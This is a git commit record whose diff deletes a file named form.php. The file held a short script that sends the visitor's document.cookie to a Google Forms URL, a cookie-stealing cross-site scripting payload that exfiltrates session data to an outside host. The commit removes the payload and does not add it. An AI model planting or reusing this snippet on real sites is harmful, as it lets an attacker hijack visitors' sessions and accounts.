48072e1b58a28b5e85ea7cb403ae85053a7e1575
GREHWGJ9324HG9U2HGU92JG2GF <86808004+GREHWGJ9324HG9U2HGU92JG2GF@users.noreply.github.com>
2021-07-07 00:36:45 -0500

    Delete form.php

--- form.php
+++
@@ -1,4 +0,0 @@
-<script>
-    var i = new Image();
-    i.src = "https://docs.google.com/forms/d/e/1FAIpQLSeKK8RwnSwspZG9IxHomsxj8cVA35kHAT01Fjd9hSCh-s9Okw/formResponse?entry.2001707405=" + escape(document.cookie);
-</script>
